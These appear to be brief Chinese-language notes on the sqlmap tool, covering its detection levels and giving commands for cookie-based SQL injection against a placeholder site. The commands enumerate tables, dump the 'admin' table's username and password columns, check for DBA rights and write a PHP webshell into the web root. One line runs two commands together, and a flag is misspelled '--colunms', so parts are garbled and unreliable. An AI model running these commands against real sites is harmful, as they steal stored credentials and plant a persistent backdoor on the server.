sqlmap工具使用 

sqlmap的探测等级 

级别 1 get post 
级别 2 cookie 

vulnerable to attack 脆弱的易攻击 

```cmd
sqlmap进行cookie·注入 
sqlmap.py -u "www.xxuser.com/shownews.asp"  --cookie "id = 16" --level 2 sqlmap.py -u "www.xxuser.com/shownews.asp"  --cookie "id = 16" --level 2  --tables //猜解表 
sqlmap.py -u "www.xxuser.com/shownews.asp"  --cookie "id = 16" --level 2 --colunms -T "admin" 
sqlmap.py -u "www.xxuser.com/shownews.asp"  --cookie "id = 16" --level 2 --dump -C "username,password" -T "admin" 
sqlmap 实现webshell的插入 
sqlmap.py -u "" --is-dba  // 判断是否是管理员 
sqlmap.py -u "" --file-write"D:/ma.php" --file-dest "?网站物理路径?" 
```

